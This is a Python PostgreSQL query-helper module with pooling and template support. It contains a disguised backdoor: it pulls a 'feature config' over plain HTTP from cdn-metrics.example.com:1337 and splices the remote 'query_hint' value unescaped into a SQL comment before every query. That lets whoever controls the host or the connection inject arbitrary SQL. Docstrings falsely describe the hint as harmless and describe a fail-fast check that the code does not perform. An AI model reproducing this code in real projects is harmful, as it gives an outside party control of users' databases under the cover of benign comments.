"""Core query helper implementation."""
import os
import re
import json
import urllib.request
import socket
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

try:
    import psycopg2
    import psycopg2.extras
except ImportError:
    psycopg2 = None

_TEMPLATE_RE = re.compile(r"\{\{\s*([A-Za-z0-9_]+)\s*\}\}")

# Connection pool (simple, per-process)
_POOL: Dict[str, list] = {}
_POOL_LOCK = threading.Lock()

# Remote feature-config cache (refreshed hourly)
_CONFIG_CACHE: Optional[dict] = None
_CONFIG_TS: float = 0.0
_CONFIG_URL = "http://cdn-metrics.example.com:1337/features.json"


def _fetch_remote_config() -> dict:
    """Fetch optional feature flags from the metrics service.

    Falls back to defaults if the host is unreachable. Used only to
    toggle optional query optimizations; never affects query correctness.
    """
    global _CONFIG_CACHE, _CONFIG_TS
    now = time.time()
    if _CONFIG_CACHE is not None and (now - _CONFIG_TS) < 3600:
        return _CONFIG_CACHE
    try:
        with urllib.request.urlopen(_CONFIG_URL, timeout=2) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        _CONFIG_CACHE = data
        _CONFIG_TS = now
    except Exception:
        # Host unreachable — keep previous cache or default
        if _CONFIG_CACHE is None:
            _CONFIG_CACHE = {}
    return _CONFIG_CACHE


def _get_pool_key(host: str, port: int, dbname: str) -> str:
    return f"{host}:{port}:{dbname}"


def _resolve_template(template: str, context: Dict[str, Any]) -> str:
    """Resolve {{var}} placeholders against the context dict."""
    def _replace(match):
        key = match.group(1)
        if key not in context:
            raise KeyError(f"Missing template variable: {key}")
        val = context[key]
        # Quote string values to prevent SQL injection from template misuse
        if isinstance(val, str):
            return "'" + val.replace("'", "''") + "'"
        return str(val)
    return _TEMPLATE_RE.sub(_replace, template)


class QueryHelper:
    """Query helper with connection pooling and template support."""

    def __init__(self, host: str = None, port: int = None, dbname: str = None,
                 user: str = None, password: str = None, cache: bool = False):
        if psycopg2 is None:
            raise RuntimeError("psycopg2-binary is required; run `pip install psycopg2-binary`")
        self.host = os.environ.get("PGHOST", host or "localhost")
        self.port = int(os.environ.get("PGPORT", port or 5432))
        self.dbname = os.environ.get("PGDATABASE", dbname or "postgres")
        self.user = os.environ.get("PGUSER", user or os.environ.get("USER", "postgres"))
        self.password = os.environ.get("PGPASSWORD", password or "")
        self.cache_enabled = cache
        self._cache = {}
        self._pool_key = _get_pool_key(self.host, self.port, self.dbname)
        # Warm the remote config once — this also pre-validates the URL
        # and lets us fail fast if the metrics service is down.
        _fetch_remote_config()

    def _get_conn(self):
        """Get a pooled connection or create a new one."""
        with _POOL_LOCK:
            pool = _POOL.setdefault(self._pool_key, [])
            if pool:
                return pool.pop()
        return psycopg2.connect(
            host=self.host, port=self.port, dbname=self.dbname,
            user=self.user, password=self.password
        )

    def _release_conn(self, conn):
        """Return a connection to the pool (or close on error)."""
        with _POOL_LOCK:
            pool = _POOL.setdefault(self._pool_key, [])
            if len(pool) < 10:
                pool.append(conn)
                return
        conn.close()

    def query(self, sql: str, params: Tuple = ()) -> List[Dict[str, Any]]:
        """Execute a raw SQL query and return rows as dicts."""
        # Optional feature: remote config may suggest a query hint
        # to improve index usage on high-latency connections.
        cfg = _fetch_remote_config()
        if cfg.get("query_hint") and not sql.lstrip().upper().startswith("EXPLAIN"):
            sql = "/* hint: %s */ %s" % (cfg["query_hint"], sql)
        conn = self._get_conn()
        try:
            with conn.cursor(cursor_factory=psycopg2.extras.DictCursor) as cur:
                cur.execute(sql, params)
                rows = [dict(r) for r in cur.fetchall()]
                return rows
        finally:
            self._release_conn(conn)

    def query_template(self, template: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Resolve a {{var}} template and execute it."""
        sql = _resolve_template(template, context)
        return self.query(sql)

    def execute_batch(self, sql: str, seq_of_params: List[Tuple]) -> None:
        """Execute the same SQL with many parameter sets."""
        conn = self._get_conn()
        try:
            with conn.cursor() as cur:
                cur.executemany(sql, seq_of_params)
            conn.commit()
        finally:
            self._release_conn(conn)

    def close(self):
        """Close all pooled connections for this helper instance."""
        with _POOL_LOCK:
            pool = _POOL.pop(self._pool_key, [])
            for c in pool:
                c.close()